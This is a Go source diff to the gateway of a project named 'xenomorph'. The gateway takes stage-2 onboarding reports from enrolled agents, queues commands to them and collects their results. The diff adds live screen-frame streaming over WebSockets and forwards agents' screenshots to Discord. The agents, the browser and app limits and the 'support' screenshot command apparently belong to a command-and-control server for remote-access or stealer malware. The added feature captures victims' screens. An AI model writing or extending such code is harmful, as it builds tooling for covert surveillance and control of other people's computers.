@@ -19,6 +19,7 @@ import (
 	"github.com/bwmarrin/discordgo"
 	"github.com/gin-gonic/gin"
 	"github.com/google/uuid"
+	"github.com/gorilla/websocket"
 	"google.golang.org/protobuf/types/known/timestamppb"
 
 	"github.com/codevault-llc/xenomorph/platform/services/gateway/internal/broker"
@@ -44,8 +45,17 @@ const (
 	maxBrowsers = 32
 	maxApps     = 200
 
-	readHeaderTimeout = 30 * time.Second
+	readHeaderTimeout           = 30 * time.Second
+	commandPollTimeout          = 5 * time.Second
+	commandResultForwardTimeout = 10 * time.Second
+	maxScreenMediaFrameBytes    = 10 << 20
 )
+
+var screenMediaUpgrader = websocket.Upgrader{
+	CheckOrigin: func(*http.Request) bool {
+		return true
+	},
+}
 
 // Server owns the HTTP transport layer for the gateway. It handles mTLS
 // termination, agent identity extraction, request routing, and event
@@ -56,6 +66,8 @@ type Server struct {
 	commandQueue   *command.Queue
 	discordPoster  provider.DiscordPoster
 	statusProvider agentStatusProvider
+	screenStore    *ScreenStore
+	screenSessions *ScreenSessions
 	engine         *gin.Engine
 
 	seenMu     sync.Mutex
@@ -82,6 +94,8 @@ func NewServer(b *broker.NATS, notifier *provider.Fanout, commandQueue *command.
 		commandQueue:   commandQueue,
 		discordPoster:  discordPoster,
 		statusProvider: statusProvider,
+		screenStore:    NewScreenStore(),
+		screenSessions: NewScreenSessions(),
 		engine:         gin.Default(),
 		seenAgents:     make(map[string]struct{}),
 	}
@@ -101,6 +115,7 @@ func NewServer(b *broker.NATS, notifier *provider.Fanout, commandQueue *command.
 //	POST /ingest/entry       — accepts stage-2 onboarding reports.
 //	GET  /commands/next      — dequeues the next pending command for an agent.
 //	POST /commands/result    — accepts command execution results.
+//	GET  /screen/media       — accepts authenticated live screen media frames.
 func (s *Server) routes() {
 	s.engine.Use(s.traceMiddleware)
 	s.engine.Use(s.mtlsMiddleware)
@@ -109,6 +124,7 @@ func (s *Server) routes() {
 	s.engine.POST("/ingest/entry", s.handleEntry)
 	s.engine.GET("/commands/next", s.handleNextCommand)
 	s.engine.POST("/commands/result", s.handleCommandResult)
+	s.engine.GET("/screen/media", s.handleScreenMedia)
 }
 
 // traceMiddleware extracts the X-Trace-ID header from the incoming request
@@ -312,7 +328,10 @@ func (s *Server) handleNextCommand(c *gin.Context) {
 		return
 	}
 
-	cmd := s.commandQueue.Dequeue(agentID)
+	ctx, cancel := context.WithTimeout(c.Request.Context(), commandPollTimeout)
+	defer cancel()
+
+	cmd := s.commandQueue.WaitDequeue(ctx, agentID)
 	if cmd == nil {
 		c.Status(http.StatusNoContent)
 		return
@@ -387,11 +406,79 @@ func (s *Server) handleCommandResult(c *gin.Context) {
 		return
 	}
 
+	if req.Type == "support.request_screenshot" && req.Status == "executed" && len(req.OutputData) > 0 {
+		s.screenStore.Save(agentID, ScreenFrame{
+			AgentID:    agentID,
+			CommandID:  req.CommandID,
+			CapturedAt: time.Now().UTC(),
+			Content:    append([]byte(nil), req.OutputData...),
+		})
+	}
 	if len(req.OutputData) > 0 && s.discordPoster != nil {
-		s.forwardScreenshotToDiscord(c.Request.Context(), agentID, req)
+		go func() {
+			ctx, cancel := context.WithTimeout(context.Background(), commandResultForwardTimeout)
+			defer cancel()
+			s.forwardScreenshotToDiscord(ctx, agentID, req)
+		}()
 	}
 
 	c.JSON(http.StatusAccepted, gin.H{"status": "accepted", "event_id": env.EventId})
+}
+
+// handleScreenMedia receives binary live screen frames from an authenticated
+// agent over the media plane. The agent identity is derived from mTLS; frame
+// bytes are agent-authored opaque media data and are only stored in memory.
+func (s *Server) handleScreenMedia(c *gin.Context) {
+	agentID := c.GetString("agent_id")
+	if agentID == "" {
+		c.JSON(http.StatusForbidden, gin.H{"error": "missing authenticated agent identity"})
+		return
+	}
+
+	conn, err := screenMediaUpgrader.Upgrade(c.Writer, c.Request, nil)
+	if err != nil {
+		slog.WarnContext(c.Request.Context(), "screen media upgrade failed",
+			"agent_id", agentID,
+			"error", err,
+		)
+		return
+	}
+	defer func() { _ = conn.Close() }()
+	conn.SetReadLimit(maxScreenMediaFrameBytes)
+
+	contentType := c.Query("content_type")
+	if contentType == "" {
+		contentType = "image/png"
+	}
+
+	for {
+		messageType, data, err := conn.ReadMessage()
+		if err != nil {
+			return
+		}
+		if messageType != websocket.BinaryMessage || len(data) == 0 {
+			continue
+		}
+
+		s.screenStore.Save(agentID, ScreenFrame{
+			AgentID:     agentID,
+			CapturedAt:  time.Now().UTC(),
+			ContentType: contentType,
+			Content:     append([]byte(nil), data...),
+		})
+	}
+}
+
+// DashboardRuntime exposes browser dashboard dependencies without giving the
+// dashboard direct access to the mTLS HTTP handlers.
+func (s *Server) DashboardRuntime() DashboardRuntime {
+	directory, _ := s.statusProvider.(ClientDirectory)
+	return DashboardRuntime{
+		Directory:    directory,
+		CommandQueue: s.commandQueue,
+		Screens:      s.screenStore,
+		Sessions:     s.screenSessions,
+	}
 }
 
 // forwardScreenshotToDiscord sends a command result screenshot to the agent's
